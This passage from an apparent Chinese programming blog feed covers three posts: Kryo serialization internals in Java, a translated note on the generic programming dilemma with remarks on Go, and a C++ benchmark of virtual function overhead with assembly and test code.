<li><p>使用transient关键字</p>
</li>
<li><p>使用Context结合@Optional注解</p>
</li>
<li><p>使用@Tag注解（很麻烦）</p>
</li>
<li><p>实现KryoSerializable接口（比较麻烦，相当于手写代码）</p>
</li>
</ol>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>可以用setReferences(boolean )函数来设置，默认是打开的。</p>
<p>引用的实现原理：</p>
<p>原本以为要实现引用是个比较麻烦的事，因为一想到引用，头脑中就出现一个图。。但在看了代码后，发现是比较简单的。</p>
<p>在Kryo类中有一个writtenObjects的ArrayList，记录已写入的对象。有一个readObjects来记录已写入的对象。</p>
<p>另外有个depth来记录深度，每写一个对象时depth++，当写完时depth–，当depth == 0时，调用reset函数，清空writtenObjects和。</p>
<p>比如写一个大对象，这个对象有很多成员，每一个成员都是一个对象，而成员之间有可能用引用关系（A引用了B，B也引用了A）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> depth, maxDepth = Integer.MAX_VALUE, nextRegisterID;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ArrayList writtenObjects = <span class="keyword">new</span> ArrayList();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ArrayList readObjects = <span class="keyword">new</span> ArrayList();</span><br></pre></td></tr></table></figure>
<p>每当写一个对象时，都到里面去检查有没有这个对象，如果有的话，就只写一个int即可。这个int是要表明这个对象当前在的位置即可。</p>
<p>因为当反序列化时，可以据读到的int，正确地从readObjects取回对象。</p>
<p>如果没有，则在输出流中写入writtenObjects的size()+1，再把这个对象放到writtenObjects中。</p>
<p>序列化时，写入引用的对象在writtenObjects中的位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, n = writtenObjects.size(); i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (writtenObjects.get(i) == object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            debug(<span class="string">"kryo"</span>, <span class="string">"Write object reference "</span> + i + <span class="string">": "</span></span><br><span class="line">                    + string(object));</span><br><span class="line">        output.writeInt(i + <span class="number">1</span>, <span class="keyword">true</span>); <span class="comment">// + 1 because 0 means null.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Only write the object the first time encountered in object graph.</span></span><br><span class="line">output.writeInt(writtenObjects.size() + <span class="number">1</span>, <span class="keyword">true</span>);</span><br><span class="line">writtenObjects.add(object);</span><br></pre></td></tr></table></figure>
<p>反序列化时，据id从readObjects得到正确的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (--id &lt; readObjects.size()) &#123;</span><br><span class="line">    Object object = readObjects.get(id);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG)</span><br><span class="line">        debug(<span class="string">"kryo"</span>, <span class="string">"Read object reference "</span> + id + <span class="string">": "</span></span><br><span class="line">                + string(object));</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>貌似每一个类都要注册下，不然只能用writeClassAndObject和readClassAndObject函数。</p>
<p>注册的顺序不能乱！！因为是每一个类都有一个id，而这个id是增长的！</p>
<p>可以设置registrationRequired，防止没有注册的情况！</p>
<h3 id="注解annotation"><a href="#注解annotation" class="headerlink" title="注解annotation"></a>注解annotation</h3><p>貌似只有四个：@Optional，@Tag，@DefaultSerializer，@NotNull</p>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>每注册一个类，都有一个id，由一个IntMap的hashMap来保存（TODO，研究下这个东东的实现）</p>
<h3 id="代码阅读笔记"><a href="#代码阅读笔记" class="headerlink" title="代码阅读笔记"></a>代码阅读笔记</h3><p>在Kryo类中有以下的成员，简单来看，就是一些HashMap，用来存放id和Class，Class和id，id和Registration，Class和Registration之间的对应关系：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IntMap&lt;Registration&gt; idToRegistration = <span class="keyword">new</span> IntMap();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ObjectMap&lt;Class, Registration&gt; classToRegistration = <span class="keyword">new</span> ObjectMap();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IdentityObjectIntMap&lt;Class&gt; classToNameId = <span class="keyword">new</span> IdentityObjectIntMap();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> IntMap&lt;Class&gt; nameIdToClass = <span class="keyword">new</span> IntMap();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> nextNameId;  <span class="comment">//不断增长，分新的Class分配一个新的id，即Registration中的id</span></span><br></pre></td></tr></table></figure>
<p>每一个类对应一个Registration：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Registration</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> id;         <span class="comment">//这个要注意，每一个类都有一个唯一的id，这个id是从0开始不断增长的</span></span><br><span class="line">    <span class="keyword">private</span> Serializer serializer;</span><br><span class="line">    <span class="keyword">private</span> ObjectInstantiator instantiator;  <span class="comment">//复制对象时候用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接看这个类的成员，就大概能明白它是怎样回事了。</p>
<p>要注意一点，Registration中的id很重要，可以说是和别的序列化方案相比，高效之处。</p>
<p>在调用Kryo.writeClass(Output output, Class type)函数时，</p>
<p>先查找到这个类的Registration，得到Serializer，再调用write (Kryo kryo, Output output, T object)写到输出流中。</p>
<p>如果没有找到的话，则为这个类生成一个Registration，并放到Kryo类中的对应的HashMap中。</p>
<p>再来说下Serializer：</p>
<p>默认是FieldSerializer，在生成Registration中，如果为这个类找不到Serializer（到defaultSerializers中找），</p>
<p>则会构造一个FieldSerializer。</p>
<p>FieldSerializer实际是有一个数组存放了每一个field的信息，当调用write (Kryo kryo, Output output, T object)函数时，则历遍所有的field，把每一个field写到输出流中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> CachedField[] fields = <span class="keyword">new</span> CachedField[<span class="number">0</span>];</span><br><span class="line">                                                     </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CachedField</span>&lt;<span class="title">X</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Field field;</span><br><span class="line">    Class fieldClass;</span><br><span class="line">    Serializer serializer;</span><br><span class="line">    <span class="keyword">boolean</span> canBeNull;</span><br><span class="line">    <span class="keyword">int</span> accessIndex = -<span class="number">1</span>;</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>
<p>Kryo有两种模式，一种是先注册(regist)，再写对象，即writeObject函数，实际上如果不先注册，在写对象时也会注册，并为class分配一个id。</p>
<p>注意，如果是rpc，则必须两端都按同样的顺序注册，否则会出错，因为必须要明确类对应的唯一id。</p>
<p>另一种是写类名及对象，即writeClassAndObject函数。</p>
<p>writeClassAndObject函数是先写入(-1 + 2)（一个约定的数字），再写入类ID（第一次要先写-1，再写类ID + 类名），写入引用关系（见引用的实现），最后才写真正的数据）。</p>
<p>注意每一次writeClassAndObject调用后信息都会清空，所以不用担心和client交互时会出错。</p>
<h3 id="代码中其它有意思的地方"><a href="#代码中其它有意思的地方" class="headerlink" title="代码中其它有意思的地方"></a>代码中其它有意思的地方</h3><p>在writeString函数中先判断是不是ascii即，所有都&lt;127，如果是在写string的最后一个字符，会执行这个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">buffer[position - <span class="number">1</span>] |= <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
<p>不知为何。。</p>
<p>在readString的时候也会判断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((b &amp; <span class="number">0x80</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// ascii</span></span><br></pre></td></tr></table></figure>
<p>是因为这个<a href="http://topic.csdn.net/t/20040416/10/2972001.html" target="_blank" rel="noopener">http://topic.csdn.net/t/20040416/10/2972001.html</a> ？所谓的双字节的？</p>
<h3 id="为什么比其它的序列化方案要快？"><a href="#为什么比其它的序列化方案要快？" class="headerlink" title="为什么比其它的序列化方案要快？"></a>为什么比其它的序列化方案要快？</h3><p>为每一个类分配一个id</p>
<p>实现了自己的IntMap</p>
<p>代码中一些取巧的地方：</p>
<p>利用变量memoizedRegistration和memoizedType记录上一次的调用writeObject函数的Class，则如果两次写入同一类型时，可以直接拿到，不再查找HashMap。</p>
<p>这个也许是为什么在测试中kryo要比其它类库要快的原因之一。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>实现KryoSerializable接口</p>
<p>像下面这样实现是错误的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Kryo kryo, Output output)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">    kryo.writeObject(output, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">                             </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(Kryo kryo, Input input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">    kryo.readObject(input, <span class="keyword">this</span>.getClass());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上只写入了默认构造函数的内容！</p>
<p>原因是在生成Registration时已在writtenObjects中写入了这个类，所以在Kryo类中的writtenObjects中已有这个类，所以在调用write函数时，如果是用下面的代码，则会以为这个类是已写过的，所以直接写了一个1和它的id！！</p>
<p>实际上如果实现了KryoSerializable接口，最终是这个类来调用接口的write函数：KryoSerializableSerializer</p>
<p><strong>正确的写法是写入每一个成员，在read函数中把数据读出，再赋值给成员。</strong></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialization</tag>
        <tag>kryo</tag>
      </tags>
  </entry>
  <entry>
    <title>泛型编程的困境</title>
    <url>/generic-translation/</url>
    <content><![CDATA[<p>原文：<a href="http://research.swtch.com/generic" target="_blank" rel="noopener">http://research.swtch.com/generic</a></p>
<p>常用的数据结构（vectors，queues，maps，trees，等等）似乎是评估一个新语言的一个热门话题。Go语言的FAQ中有一条就是关于Go中的泛型编程。对于泛型编程的通常有以下三种处理方式：</p>
<p>1.（C语言）放弃泛型。这样苦了程序员，但是这样没前增加太多复杂的东西到语言中。</p>
<p>2.（C++语言）编译期特化或者大量地展开代码。这样苦了编译器。编绎器生成一堆代码，而大部分是无用的，需要一个很好的链接器去清除重复的副本。为每一个类型生成一份代码，也许这样会让代码高效，但是程序是一个整体，这样会造成对cpu的cache不友好。我曾听说一个简单的库修正和移除了模板后，text段（即动态链接库的文件格式中的text段）的大小从M级降到10K。</p>
<p>3.（Java语言）隐式地把所有东西装箱。这样苦了程序，这样执行起来会变慢。<br>对比C语言的手写，C++语言的编译器生成，Java代码最简单，但是最低效，无论是从时间还是空间来说。因为所有的操作都要隐式地装箱和拆箱。一个byte的vector容器(Vector<byte>)所占的空间比远超一个字节每一个byte。想要隐藏装箱和拆箱会让类型系统变复杂。从另一个方面来说，这个也许是指令cache友好的，因为它把一个byte的vector(Vector<byte>)可以分开来写每一个byt e。</byte></byte></p>
<p>泛型编程的困境是：要么苦了程序员，要么苦了编绎器，要么降低运行时效率。</p>
<hr>
<p>原文作者是Go语言的实现者之一。</p>
<p>从Go的FAQ中也可以看到他们并不急于去实现泛型，是因为还没有找到一个合适的实现方案去解决上面的困境。</p>
<p>因为Go目前没有泛型，所以只能用interface来实现常用的数据结构了。但是从我个人角度来看Go中的interface的效率有点慢（比C++中的虚函数要慢，想想一个Vector容器，调用一个get函数，都比调用C++的一个虚函数还要慢。。）。</p>
<p>所以在Go1.0之前，有Vector容器时，另外还有一个IntVector和一个StringVector。想想有够蛋疼的，如果我想用一个高效float的Vector，是不是还要写一个FloatVector？</p>
<p>如果Go能支持泛型，那真是相当令人高兴的一件事。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>generic</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中虚函数(virtual function)到底有多慢</title>
    <url>/cpp-virtual-function/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虚函数为什么慢，cpu分支预测技术，虚函数到底要调用哪些汇编，虚函数实现的简单图示，虚函数不能内联，</p>
<p>印象中经常看到有人批评C++的虚函数很慢，但是虚函数为什么慢，虚函数到底有多慢呢？</p>
<h2 id="理论分析"><a href="#理论分析" class="headerlink" title="理论分析"></a>理论分析</h2><p>虚函数慢的原因主要有三个：</p>
<ul>
<li>多了几条汇编指令（运行时得到对应类的函数的地址）</li>
<li>影响cpu流水线</li>
<li>编译器不能内联优化（仅在用父类引用或者指针调用时，不能内联）</li>
</ul>
<p>先简单说下虚函数的实现，以下面测试代码中的VirtualVector类为例，VirtualVector类的内存布局如下：</p>
<p><img src="/img/cpp-vtable.jpg" alt></p>
<p>当在用父类的引用或者指针调用虚函数时，会先从该对象的头部取到虚函数的地址（C++标准规定虚函数表地址必须放最前），再从虚函数表中取到实际要调用的函数的地址，最终调用该函数，汇编代码大概如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">			sum += v.at(i);       <span class="comment">//要调用at函数</span></span><br><span class="line"><span class="number">00</span>CF1305  mov         eax,dword ptr [ebx]     <span class="comment">//取到对象的虚函数表地址</span></span><br><span class="line"><span class="number">00</span>CF1307  mov         edx,dword ptr [eax+<span class="number">4</span>]   <span class="comment">//取到实际VirtualVector类的at函数地址，因为at是第二个虚函数，所以要+4，如果是clear则+8，push_back则不加</span></span><br><span class="line"><span class="number">00</span>CF130A  push        esi                     <span class="comment">//参数压栈</span></span><br><span class="line"><span class="number">00</span>CF130B  mov         ecx,ebx                 </span><br><span class="line"><span class="number">00</span>CF130D  call        edx                     <span class="comment">//调用真正的VirtualVector类的at函数</span></span><br></pre></td></tr></table></figure>
<p><strong>所以，我们可以看到调用虚函数，相比普通函数，实际上多了三条汇编指令（取虚表，取函数地址，call调用）。</strong></p>
<p><strong>至于虚函数如何影响cpu的流水线，则主要是因为call指令</strong>，具体可以看这个网址的演示：</p>
<p>CPU流水线的一个演示：<a href="http://www.pictutorials.com/Instruction_Pipeline.html" target="_blank" rel="noopener">http://www.pictutorials.com/Instruction_Pipeline.html</a></p>
<p>第3点，编译器不能内联优化，则是因为在得到子类的引用或者指针之前，根本不知道要调用哪一个函数，所以无从内联。</p>
<p>但是，要注意的是，对于子类直接调用虚函数，是可以内联优化的。如以下的代码，编译器是完全可以内联展开的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VirtualVector <span class="title">v</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line">v.push_back(<span class="number">1</span>);</span><br><span class="line">v.at(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h2 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h2><p>光说不练显然不行，下面用代码来测试下虚函数到底有多慢。</p>
<p>下面的代码只是测试用，不考虑细节。</p>
<p>Vector类包装了一个数组，提供push_back，at，clear函数。</p>
<p>VirtualVector类继承了IVector，同样实现了push_back，at，clear函数，但是都是虚函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> size = <span class="number">100000000</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Vector(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IVector</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">virtual</span> ~IVector() &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector</span> :</span> <span class="keyword">public</span> IVector&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	~VirtualVector()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">array</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">delete</span> <span class="built_in">array</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorPush</span><span class="params">(Vector&amp; v)</span></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorAt</span><span class="params">(Vector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorPush</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorAt</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(VirtualVector)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	Vector *v = <span class="keyword">new</span> Vector(size);</span><br><span class="line">	VirtualVector *V = <span class="keyword">new</span> VirtualVector(size);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的是只有一层继承的情况时的结果，<strong>尽管从虚函数的实现角度来看，多层继承和一层继承调用虚函数的效率都是一样的。</strong></p>
<p>但是为了测试结果更加可信，下面是一个6层继承的测试代码（为了防止编译器的优化，有很多垃圾代码）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> size = <span class="number">100000000</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Vector(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span 